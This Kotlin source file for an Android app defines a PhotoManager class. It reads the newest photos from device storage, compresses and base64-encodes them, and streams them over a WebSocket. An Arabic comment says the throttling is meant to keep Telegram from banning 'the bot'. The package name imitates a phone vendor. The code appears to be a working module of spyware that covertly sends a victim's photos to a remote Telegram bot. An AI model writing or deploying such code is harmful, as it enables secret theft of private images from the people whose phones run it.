package vivo.communication

import android.content.ContentUris
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.provider.MediaStore
import android.util.Base64
import okhttp3.WebSocket
import java.io.ByteArrayOutputStream

class PhotoManager(private val context: Context, private val ws: WebSocket) {

    fun startSendingPhotos(count: Int) {
        Thread {
            try {
                val photos = mutableListOf<Uri>()
                val projection = arrayOf(MediaStore.Images.Media._ID)
                val cursor = context.contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection, null, null,
                    MediaStore.Images.Media.DATE_ADDED + " DESC"
                )

                cursor?.use {
                    while (it.moveToNext() && photos.size < count) {
                        val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                        photos.add(ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id))
                    }
                }

                if (photos.isEmpty()) {
                    ws.send("photos_done")
                    return@Thread
                }

                for (uri in photos) {
                    try {
                        val inputStream = context.contentResolver.openInputStream(uri)
                        val bitmap = BitmapFactory.decodeStream(inputStream)
                        inputStream?.close()

                        val baos = ByteArrayOutputStream()
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos)
                        val base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)

                        ws.send("photo:$base64")
                        Thread.sleep(800) // تأخير عشان تيليجرام ما يحظر البوت
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }
                ws.send("photos_done")

            } catch (e: Exception) {
                ws.send("photos_error")
            }
        }.start()
    }
}